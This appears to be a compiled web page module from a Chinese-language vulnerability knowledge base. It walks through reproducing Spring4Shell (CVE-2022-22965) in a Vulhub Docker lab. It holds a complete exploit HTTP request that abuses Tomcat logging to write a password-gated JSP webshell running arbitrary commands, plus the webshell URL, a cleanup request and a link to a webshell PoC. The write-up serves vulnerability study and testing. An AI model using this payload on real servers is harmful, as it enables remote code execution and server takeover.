import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as l,a as e,b as n,d as a,e as c}from"./app-58e4a7d6.js";const d={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,"在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。",-1),u=e("p",null,"现在已知的利用方法要求应用程序以 WAR 部署的形式在 Tomcat 上运行，然而，该漏洞的性质更为普遍，可能有其他方法可以利用它。",-1),m=e("p",null,"参考链接：",-1),h={href:"https://tanzu.vmware.com/security/cve-2022-22965",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Spring WebMVC 5.3.17 服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问 <code>http://your-ip:8080/?name=Bob&amp;age=25</code> 即可看到一个演示页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下数据包，即可修改目标的 Tomcat 日志路径与后缀，利用这个方法写入一个 JSP 文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: your-:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %&gt;//
c1: Runtime
c2: &lt;%
DNT: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412215932241.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后，访问刚写入的 JSP Webshell，执行任意命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/tomcatwar.jsp?pwd=j&amp;cmd=id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412220112693.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>注意，需要在利用完成后将 <code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code> 清空，否则每次请求都会写入新的恶意代码在 JSP Webshell 中，导致这个文件变得很大。发送如下数据包将其设置为空：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。</p><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,15),v={href:"https://github.com/4nth0ny1130/spring4shell_behinder",target:"_blank",rel:"noopener noreferrer"};function _(f,x){const i=s("ExternalLinkIcon");return r(),l("div",null,[o,p,u,m,e("ul",null,[e("li",null,[e("a",h,[n("https://tanzu.vmware.com/security/cve-2022-22965"),a(i)])]),e("li",null,[e("a",g,[n("https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"),a(i)])])]),b,e("ul",null,[e("li",null,[n("spring4shell_behinder："),e("a",v,[n("https://github.com/4nth0ny1130/spring4shell_behinder"),a(i)])])])])}const B=t(d,[["render",_],["__file","Spring Data Binding与JDK 9_导致的远程代码执行漏洞 CVE-2022-22965.html.vue"]]);export{B as default};
